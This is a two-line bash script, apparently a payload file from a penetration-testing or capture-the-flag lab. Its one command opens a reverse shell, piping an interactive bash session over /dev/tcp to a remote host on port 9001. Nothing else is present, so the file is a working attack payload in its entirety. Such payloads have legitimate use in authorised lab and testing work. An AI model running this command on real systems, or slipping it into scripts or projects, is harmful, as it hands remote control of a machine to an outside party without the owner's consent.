#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.10.14.152/9001 0>&1"
